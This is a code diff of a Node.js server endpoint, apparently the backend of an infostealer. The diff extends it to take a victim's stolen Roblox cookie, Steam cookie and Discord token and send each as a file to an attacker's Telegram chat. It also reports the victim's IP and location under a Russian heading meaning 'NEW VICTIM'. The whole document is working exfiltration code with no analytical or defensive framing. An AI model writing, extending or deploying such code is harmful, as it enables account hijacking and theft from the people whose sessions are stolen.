@@ -12,27 +12,40 @@ const API = "https://api.telegram.org/bot" + TOKEN;
 
 app.post('/send', async (req, res) => {
     try {
-        const { ip, country, city, cookie } = req.body;
+        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;
 
-        let msg = "👋 ЗАПУЩЕН\n\n";
+        let msg = "🔴 <b>НОВАЯ ЖЕРТВА</b>\n\n";
         if (ip) {
-            msg += "IP: " + ip + "\n";
-            msg += "Страна: " + (country || "Н/Д") + "\n";
-            msg += "Город: " + (city || "Н/Д");
+            msg += "🌐 <b>IP:</b> <code>" + ip + "</code>\n";
+            msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
+            msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
         }
 
         await axios.post(API + "/sendMessage", {
             chat_id: CHAT_ID,
-            text: msg
+            text: msg,
+            parse_mode: "HTML"
         });
 
-        if (cookie) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', cookie, 'cookies.txt');
-            await axios.post(API + "/sendDocument", formData, {
-                headers: { 'Content-Type': 'multipart/form-data' }
-            });
+        if (robloxCookie) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', robloxCookie, 'roblox_cookie.txt');
+            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
+        }
+
+        if (steamCookie) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', steamCookie, 'steam_cookie.txt');
+            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
+        }
+
+        if (discordToken) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', discordToken, 'discord_token.txt');
+            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
         }
 
         res.json({ ok: true });
